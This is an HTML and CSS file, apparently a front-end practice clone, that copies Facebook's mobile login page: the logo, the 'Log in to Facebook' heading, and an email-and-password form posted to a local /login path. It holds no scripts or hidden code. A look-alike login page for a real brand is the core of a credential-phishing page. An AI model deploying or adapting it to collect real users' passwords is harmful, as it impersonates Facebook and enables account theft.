<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Facebook Login UI</title>


<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}


body{

    background:#ffffff;

}


.container{

    width:100%;
    min-height:100vh;

    display:flex;
    flex-direction:column;
    align-items:center;

}



.logo{

    margin-top:45px;

}



.logo img{

    width:70px;

}



.login-box{

    width:90%;
    max-width:360px;

    margin-top:55px;

}



.login-box h2{

    font-size:18px;

    margin-bottom:25px;

    font-weight:600;

}



.input-box{

    width:100%;

    margin-bottom:18px;

}



.input-box input{


    width:100%;

    height:58px;


    padding:0 18px;


    border:1px solid #ccd0d5;


    border-radius:16px;


    outline:none;


    font-size:18px;


}



.input-box input:focus{


    border:2px solid #1877f2;


}



.login-btn{


    width:100%;

    height:55px;


    background:#1877f2;


    color:white;


    border:none;


    border-radius:30px;


    font-size:20px;


    font-weight:bold;


    cursor:pointer;


}



.login-btn:hover{


    background:#166fe5;


}



.forgot{


    text-align:center;


    margin-top:25px;


}



.forgot a{


    color:#111;


    text-decoration:none;


    font-size:18px;


}



.create{


    width:100%;

    margin-top:80px;


}



.create button{


    width:100%;

    height:52px;


    background:white;


    color:#1877f2;


    border:1.5px solid #1877f2;


    border-radius:30px;


    font-size:20px;


    cursor:pointer;


}


</style>


</head>



<body>


<div class="container">



<div class="logo">


<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">


</div>




<div class="login-box">



<h2>
Log in to Facebook
</h2>



<form action="/login" method="POST">



<div class="input-box">


<input

type="text"

name="email"

placeholder="Email address or mobile number"

required>


</div>





<div class="input-box">


<input

type="password"

name="password"

placeholder="Password"

required>


</div>





<button class="login-btn" type="submit">


Log in


</button>




</form>





<div class="forgot">


<a href="/forget">

Forgotten password?

</a>


</div>






<div class="create">


<button>


Create new account


</button>


</div>




</div>



</div>



</body>


</html>
